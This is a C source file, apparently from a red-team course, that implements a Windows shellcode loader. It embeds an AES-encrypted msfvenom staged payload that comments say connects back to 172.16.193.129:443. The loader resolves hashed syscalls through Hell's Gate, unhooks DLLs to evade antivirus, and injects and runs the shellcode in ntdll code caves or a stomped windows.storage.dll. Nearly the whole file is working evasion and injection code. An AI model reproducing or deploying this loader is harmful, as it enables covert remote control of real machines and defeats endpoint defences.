/*

 Red Team Operator course code template
 Module stomping

 author: reenz0h (twitter: @SEKTOR7net)

*/
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "peb_structs.h"
#include "definitions.h"

#pragma comment (lib, "advapi32") 

//msvenom stageless payload. -f raw then aes encrypted. 172.16.193.129 443 -> gets flagged by AV for some bullshit. likely whatever msfvenom uses to decyrpt the shellcode at runtime is triggering it.
//unsigned char key[] = { 0xf0, 0xa8, 0x70, 0x8, 0x65, 0x4b, 0x22, 0xfb, 0x67, 0x72, 0xc7, 0xea, 0x4e, 0x68, 0x56, 0x22 };


//msfvenom staged payload -f raw then aes encrypted.  172.16.193.129 443 -> will not get flagged if i unhook these three libraries -> kernel32.dll, kernelbase, ntdll.dll
//these libs likely need to be unhooked b/c the 2nd stage payload makes use of some functions that are hooked, even tho the first stage gets by effortlessly and doesn't get picked up on a disk scan.
unsigned char payload[] = { 0x54, 0x88, 0x50, 0xd, 0xb3, 0xf0, 0x70, 0xaa, 0x38, 0xb9, 0x9d, 0x45, 0xb9, 0xde, 0x48, 0x8e, 0xb, 0xfe, 0xee, 0xa5, 0xb5, 0x2e, 0xad, 0xbd, 0xbb, 0x74, 0x1b, 0xbe, 0x28, 0xf8, 0x93, 0xd0, 0x3d, 0x3b, 0xd3, 0x3c, 0x29, 0x24, 0xf3, 0xe3, 0xa6, 0x21, 0x2b, 0x3b, 0xe2, 0xe0, 0xb2, 0x51, 0x21, 0x50, 0xe1, 0xe1, 0x47, 0xad, 0xd6, 0x78, 0x4d, 0x3e, 0x80, 0x4f, 0xff, 0xc3, 0x85, 0x7a, 0x98, 0xf2, 0xab, 0x26, 0xab, 0x7e, 0x22, 0x40, 0x21, 0xac, 0x5f, 0x34, 0x6f, 0x91, 0xf5, 0xc8, 0x88, 0x19, 0x70, 0x29, 0x47, 0x5e, 0x29, 0xb2, 0x86, 0x64, 0x1f, 0x7d, 0x53, 0x63, 0x38, 0xd8, 0xa0, 0xa8, 0xd4, 0x8a, 0x1c, 0x59, 0x5d, 0x68, 0xfb, 0x6f, 0x58, 0x44, 0x73, 0x55, 0x26, 0xe9, 0xe4, 0x18, 0x19, 0x19, 0xf, 0x8f, 0x6, 0x3c, 0x2f, 0xab, 0xbb, 0xe0, 0xa0, 0x82, 0xfa, 0x79, 0xa0, 0xe, 0x2f, 0x39, 0xf2, 0x9c, 0x89, 0xb0, 0xbe, 0x1c, 0x1e, 0x4d, 0xb4, 0x9c, 0xd2, 0x16, 0x74, 0x28, 0xcb, 0x26, 0x77, 0x44, 0x30, 0x14, 0xaa, 0xd3, 0xcf, 0x8d, 0xd5, 0x1f, 0xdb, 0xe7, 0xe1, 0x8b, 0x77, 0x82, 0x71, 0x10, 0xdb, 0x34, 0x57, 0xba, 0xf5, 0xd7, 0x3f, 0xf8, 0x38, 0x30, 0x6, 0xce, 0xa1, 0x65, 0x84, 0x2e, 0xc6, 0x20, 0x9e, 0x5a, 0x40, 0xac, 0x27, 0xdc, 0xc5, 0x6d, 0x34, 0x4f, 0x4c, 0x39, 0xaa, 0x82, 0xf4, 0xa8, 0xe8, 0x34, 0x40, 0x5f, 0x5d, 0xe6, 0xae, 0x14, 0xbf, 0x9b, 0x23, 0xeb, 0x4c, 0x90, 0xad, 0x77, 0xce, 0xd7, 0xb8, 0xe9, 0x14, 0x1, 0x8, 0x80, 0xd5, 0x86, 0x79, 0x45, 0xba, 0x18, 0x88, 0xa4, 0xaa, 0x64, 0x73, 0x7a, 0x72, 0x19, 0x21, 0x88, 0x53, 0xa5, 0xa, 0x95, 0xc, 0xa7, 0x21, 0x42, 0xeb, 0xd, 0x38, 0x9, 0xe3, 0x1, 0xe2, 0x44, 0xbb, 0x5f, 0x6c, 0xea, 0x21, 0xaa, 0x3, 0x7e, 0xf5, 0x7d, 0xb7, 0xf, 0x4f, 0x5d, 0x70, 0xb3, 0x54, 0x8, 0x1d, 0x7e, 0xd, 0xda, 0x43, 0xe0, 0x5a, 0x5e, 0x57, 0x9f, 0x49, 0x7, 0x11, 0x73, 0xe0, 0x5e, 0x99, 0xb6, 0xb2, 0x9f, 0x97, 0x20, 0xd4, 0xcc, 0xad, 0x36, 0xa6, 0x83, 0x29, 0xa7, 0x69, 0xd3, 0xbd, 0x29, 0xb4, 0xcc, 0xff, 0xff, 0xc, 0xfd, 0xb0, 0xd3, 0xa, 0xca, 0x72, 0xdc, 0xfb, 0xd5, 0x38, 0x6, 0x72, 0x8b, 0x90, 0x6f, 0xf8, 0x37, 0xe7, 0xeb, 0xc6, 0x91, 0xc4, 0x33, 0xc8, 0x9e, 0xc5, 0x2b, 0xcf, 0xe8, 0x45, 0xa1, 0x3c, 0xfe, 0x28, 0x36, 0xd7, 0xed, 0x4, 0x61, 0xa6, 0x4c, 0x82, 0xc, 0xf, 0xf1, 0x88, 0x6d, 0xa2, 0x2b, 0x51, 0xeb, 0x2f, 0x97, 0x55, 0xa3, 0x35, 0x81, 0xa9, 0xfc, 0xcf, 0x9e, 0x45, 0x8b, 0x76, 0x95, 0x45, 0xc2, 0x40, 0x50, 0x15, 0x1d, 0x86, 0xca, 0x44, 0x1a, 0xcc, 0xaf, 0x46, 0x67, 0xd1, 0x5c, 0xc3, 0xc1, 0xbf, 0x61, 0x7c, 0x4, 0x65, 0x8f, 0x92, 0x22, 0x7f, 0x20, 0x3d, 0xda, 0xdb, 0x2, 0x7d, 0x21, 0x16, 0xa7, 0xa2, 0xfe, 0xea, 0x14, 0x6a, 0x78, 0xbb, 0xf4, 0xa1, 0xef, 0x3d, 0x1d, 0x4e, 0xc9, 0xab, 0x6, 0x70, 0xf8, 0x40, 0x41, 0x87, 0xd8, 0x9, 0xee, 0xc6, 0x24, 0xeb, 0xd2, 0x36, 0xac, 0x33, 0xa3, 0xb3, 0xce, 0x39, 0x57, 0x24, 0x59, 0xb1, 0xf2, 0x28, 0x68, 0xac, 0x9d, 0x49, 0x47, 0x8a, 0x7c, 0x9f, 0xf2, 0x91, 0x8, 0x20, 0xcb, 0x97, 0xdc, 0x56, 0xb2, 0xaf, 0x26, 0x48, 0x46, 0xe4, 0xdf, 0x7e, 0x42, 0xc8, 0x6c, 0x4f, 0x87, 0x69, 0x14, 0xb4, 0x46, 0xd1, 0x5e, 0x14, 0xcd, 0x2c, 0x5a, 0xad, 0x5f, 0x67, 0x33, 0xab, 0x3f, 0xe5, 0xfa, 0x7b, 0x5a, 0x9, 0xcc, 0xac, 0x38, 0xfb, 0x70, 0x22, 0xb7, 0x9e, 0xc, 0x25, 0xc, 0x58, 0xa5, 0x17, 0x6c, 0xb6, 0xd4, 0xbc, 0x8a, 0x5c, 0xcc, 0x8b, 0x54, 0x58, 0xde, 0x50, 0x65, 0x8, 0xd7, 0xb, 0x76, 0x1a, 0x25, 0x46, 0x67, 0x7f, 0xee, 0x40, 0x33, 0xd5, 0x6f, 0x53, 0x62, 0x9e, 0x4e, 0x9c, 0xa9, 0xce, 0x70, 0x42, 0x24, 0x7e, 0x70, 0xaf, 0xe0, 0x90, 0xef, 0x32, 0xd2, 0xb, 0x95, 0xa3, 0x8, 0x79, 0x27, 0x1b, 0xdd, 0xc2, 0x47, 0x2b, 0x90, 0x51, 0xb8, 0x7c, 0xca, 0x59, 0x7e, 0xcc, 0x24, 0xdf, 0xbd, 0xa7, 0xac, 0xff, 0x43, 0xca, 0x50, 0x4, 0x37, 0xd8, 0x4a, 0xf6, 0x4d, 0x8e, 0xc6, 0xe3, 0xc, 0xb0, 0xf2, 0x97, 0x2e, 0xfd, 0x12 };
unsigned char key[] = { 0x2c, 0x6a, 0x96, 0xef, 0x6b, 0xa0, 0xe0, 0x76, 0xe1, 0xe, 0x5f, 0x18, 0xca, 0xed, 0xbe, 0x16 };


SIZE_T payload_len = sizeof(payload);

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}


void PopulateVxTable(PVX_TABLE table, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PLDR_DATA_TABLE_ENTRY pLdrDataEntry) {

	//populate api hashes in table.
	table->NtAllocateVirtualMemory.dwHash = 0xf5bd373480a6b89b;
	table->NtCreateThreadEx.dwHash = 0x64dc7db288c5015f;
	table->NtProtectVirtualMemory.dwHash = 0x858bcb1046fb6a37;
	table->NtWaitForSingleObject.dwHash = 0xc6a2fa174e551bcb;
	table->NtQueryVirtualMemory.dwHash = 0x683158f59618ee0c;
	table->NtOpenProcess.dwHash = 0x718CCA1F5291F6E7;
	table->NtOpenFile.dwHash = 0x4A063563C4387908;
	table->NtCreateSection.dwHash = 0xF38A8F71AF24371F;
	table->NtMapViewOfSection.dwHash = 0xF037C7B73290C159;
	table->NtReadFile.dwHash = 0x4A06357E3033C3D2;
	table->NtCreateFile.dwHash = 0xE4672568EEF00D8A;

	//9618ee0c
	//0xffffffff9618ee0c
	//0x683158f59618ee0c

	//retieve api locations & syscalls and populate them in the table
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtAllocateVirtualMemory))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateThreadEx))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtProtectVirtualMemory))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtWaitForSingleObject))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtQueryVirtualMemory))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtOpenProcess))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtOpenFile))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateSection))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtMapViewOfSection))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtReadFile))
		return -1;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &table->NtCreateFile))
		return -1;
}

//returns a handle to the current process using NtOpenProcess syscall and the hellsgate / hells decent function.
	//don't need this function to obtain handle to the current process.
	//HANDLE currProcHandle = GetCurrProcessHandle(table);
HANDLE GetCurrProcessHandle(PVX_TABLE table) {
	//open a handle to the current process.
	HANDLE currProcess = NULL;
	OBJECT_ATTRIBUTES objAttrs = { 0 };
	CLIENT_ID cID;
	cID.UniqueThread = NULL;
	DWORD dwProcessId = GetCurrentProcessId();
	cID.UniqueProcess = ULongToHandle(dwProcessId);

	NTSTATUS status = 0x00000000;
	HellsGate(table->NtOpenProcess.wSystemCall);
	status = HellDescent(&currProcess,
		 PROCESS_QUERY_INFORMATION,
		&objAttrs, &cID);

	return currProcess;
}

//finds a valid place for us to inject our shellcode into. It will search for a code cave "00000000" area in a preloaded module
//this prevents the loading of a new module and will not overwrite memory spaces.
//
int FindCodeCaves(PLDR_DATA_TABLE_ENTRY Module, PCC_OBJECT CodeCave, int ShellCodeSize, PVX_TABLE table) {
	DWORD i = 0;
	//Create a Really Long Egg
	BYTE pattern[] = "\x00\x00\x00\x00\x00\x00\x00\x00";
	BYTE patt[] = "\x00";

	//Num Caves
	DWORD CaveCounter = 0;
	//Start for loop at 0 until we're at the end of the image.
	for (i = 0; i < Module->SizeOfImage - 8; i++) {
		//Compare our egg and our DllBase + offset (i), if a match is found continue, otherwise offset += 1
		if (!memcmp((char *)Module->DllBase + i, pattern, 8)) {
			//create a second offset variable for determining cave size.
			DWORD x = 0;
			//create variable to store size.
			DWORD64 size = 0;
			//start second loop that will loop through our entire cave using start of the cave (DLLBase + i) and our current cave offset (x),
			//loop stops if the byte read is not 00 (end of cave) or we reach end of image (Module->SizeOfImage -1)
			while (!memcmp((char*)Module->DllBase + i + x, patt, 1) && (i + x < (Module->SizeOfImage - 1))) {
				size += 1;
				x += 1;
			}
			
			//Only save locations that are greater or equal to our payload size
			if (size >= ShellCodeSize) {
				//Only save locations that are memory regions with execute permissions, so we can simply change it back to the previous page protection.
				ULONG protection = QueryMemoryProtections(table, Module, i);
				if (protection == 0x10 || protection == 0x20 || protection == 0x40 || protection == 0x80 && !(protection | PAGE_NOACCESS)) {
					//save and then increment num of caves found.
					CodeCave->Size = size;
					CodeCave->pAddress = (char*)Module->DllBase + i;
					CodeCave->offset = i;
					CodeCave->protection = protection;
					CaveCounter += 1;
					break;
				}
			}
			i += size;
		}
	}
	//return num of caves found.
	return CaveCounter;
}


//Query memory protections of a targeted region. Will Return the protection value read.
ULONG QueryMemoryProtections(PVX_TABLE table, PLDR_DATA_TABLE_ENTRY Module, int i) {
	NTSTATUS status = 0x00000000;
	MEMORY_BASIC_INFORMATION mbi = { 0 };
	
	HellsGate(table->NtQueryVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1,(char *)Module->DllBase + i, NULL, &mbi, sizeof(mbi), NULL);

	return mbi.Protect;
}

//injects shellcode using previously resolved syscalls and the hellsgate/decent functions.
BOOL InjectShellCode(PCC_OBJECT CodeCave, PVX_TABLE table) {

	//printf("code cave address %p\n", CodeCave->pAddress);

	NTSTATUS status = 0x00000000;
	HANDLE u32 = LoadLibraryA("User32.dll");
	//We need to create a new pointer to our code cave b/c the call to NtProtectVirtualMemory will return the virtual address page of that region which is an issue.
	PVOID CodeCaveAddr = NULL;
	memcpy(&CodeCaveAddr, &CodeCave->pAddress, sizeof(CodeCaveAddr));
	//0x00007ffe3344a592
	//getchar();

	// Change page permissions for the targeted code cave
	ULONG ulOldProtect = 0;
	HellsGate(table->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &CodeCaveAddr, &payload_len, PAGE_READWRITE, &ulOldProtect);
		
	//printf("Code Cave Protections Made Read Write\n");

	//inject targeted shellcode
	VxMoveMemory(CodeCave->pAddress, payload, sizeof(payload));
	//memcpy(CodeCaveAddr, payload, payload_len);

	//printf("Code Cave should be filled with shellcode\n");// getchar();

	//Change protections back to execute read
	ULONG ulNewProtect = 0;
	memcpy(&CodeCaveAddr, &CodeCave->pAddress, sizeof(CodeCaveAddr));
	HellsGate(table->NtProtectVirtualMemory.wSystemCall);
	status = HellDescent((HANDLE)-1, &CodeCaveAddr, &payload_len, CodeCave->protection, &ulNewProtect);

	//printf("Code Cave should now be execute read again... executing\n");

	//Create thread
	HANDLE hHostThread = INVALID_HANDLE_VALUE;
	HellsGate(table->NtCreateThreadEx.wSystemCall);
	status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)CodeCave->pAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

	//Wait for 1 second
	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;
	//Timeout.QuadPart = 0xFFFFFFFF;
	HellsGate(table->NtWaitForSingleObject.wSystemCall);
	//status = HellDescent(hHostThread, FALSE, &Timeout);
	status = HellDescent(hHostThread, FALSE, NULL);

	return TRUE;
	
}

BOOL InjectSCModuleStomp(HMODULE hVictimLib, VX_TABLE table) {
	NTSTATUS status = 0;
	if (hVictimLib != NULL) {

		HANDLE u32 = LoadLibraryA("User32.dll");
		//char * ptr = (char *) VirtualAlloc(NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		//PVOID ptr = NULL;
		DWORD oldprotect = 0;
		char * ptr = (char*)hVictimLib + 2 * 4096 + 12;
		SIZE_T len = NULL;
		memcpy(&len, &payload_len, sizeof(len));
		PVOID changeablePtr = 0;
		memcpy(&changeablePtr, &ptr, sizeof(changeablePtr));
		HellsGate(table.NtProtectVirtualMemory.wSystemCall);
		status = HellDescent((HANDLE)-1, &changeablePtr, &len, PAGE_READWRITE, &oldprotect);

		DWORD outSize = 0;
		VxMoveMemory(ptr, payload, payload_len);

		// restore previous memory protection settings
		HellsGate(table.NtProtectVirtualMemory.wSystemCall);
		status = HellDescent((HANDLE)-1, &changeablePtr, &payload_len, oldprotect, &oldprotect);

		// launch shellcode by creating function pointer, calls shellcode w/o spawning a new thread.
		void (*go)() = (void (*)()) ptr; go();

		// launch shellcode by creating a new thread.
		//HANDLE hHostThread = INVALID_HANDLE_VALUE;
		//HellsGate(table.NtCreateThreadEx.wSystemCall);
		//status = HellDescent(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)ptr, NULL, FALSE, NULL, NULL, NULL, NULL);

		//Wait for 1 second
		//LARGE_INTEGER Timeout;
		//Timeout.QuadPart = -10000000;
		//Timeout.QuadPart = 0xFFFFFFFF;
		//HellsGate(table.NtWaitForSingleObject.wSystemCall);
		//status = HellDescent(hHostThread, FALSE, &Timeout);
		//status = HellDescent(hHostThread, FALSE, 0);
	}
}

//This function obtains a pointer to the TEB using the GS register + 48 bytes (30 hex)
//then using the TEB we obtain a pointer to the PEB and return that value.
PPEB GetPointerToPEB() {
	PTEB pTEB = RtlGetThreadEnvironmentBlock();
	PPEB pPEB = pTEB->ProcessEnvironmentBlock;
	if (!pTEB || !pPEB || pPEB->OSMajorVersion != 0xA) {
		return -1;
	}
	return pPEB;
}

void ShellCodeInjectionViaBreadManModuleStomping(VX_TABLE table, PLDR_DATA_TABLE_ENTRY pLdrDataEntry) {
	
	
	//Decrypt our payload
	AESDecrypt(payload, payload_len, key, sizeof(key));
	SIZE_T maxSize = 0x00004000;
	//Find Code Caves for target Module Retrieved from PEB
	if (payload_len < maxSize) {
		//Create Array of Code Cave Entries
		CC_OBJECT CodeCave = { 0 };

		int NumCaves = FindCodeCaves(pLdrDataEntry, &CodeCave, payload_len, &table);

		//for (int i = 0; i < NumCaves; i++) {
		//	printf("Code Cave Located At : % p with a size of % d\n", CodeCaves[i].pAddress, (int)CodeCaves[i].Size);
		//}
		//getchar();

		InjectShellCode(&CodeCave, &table);
	}
	else {
		unsigned char sLib[] = { 'w','i','n','d','o','w','s','.','s','t','o','r','a','g','e','.','d','l','l', 0x0 };
		HMODULE hVictimLib = LoadLibraryA((LPCSTR)sLib);
		InjectSCModuleStomp(hVictimLib, table);
	}
	return;
}


int main(void) {
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	//obtain pointer to PEB.
	PPEB pPEB = GetPointerToPEB();

	// Get NTDLL module 
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPEB->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

	//Get EAT Table
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return -1;
	//Create VXTable
	VX_TABLE table = { 0 };

	//Populate its entries
	PopulateVxTable(&table, pImageExportDirectory, pLdrDataEntry);
	
	UnhookingMainFunction(&table);
	ShellCodeInjectionViaBreadManModuleStomping(table, pLdrDataEntry);
	return 0;
}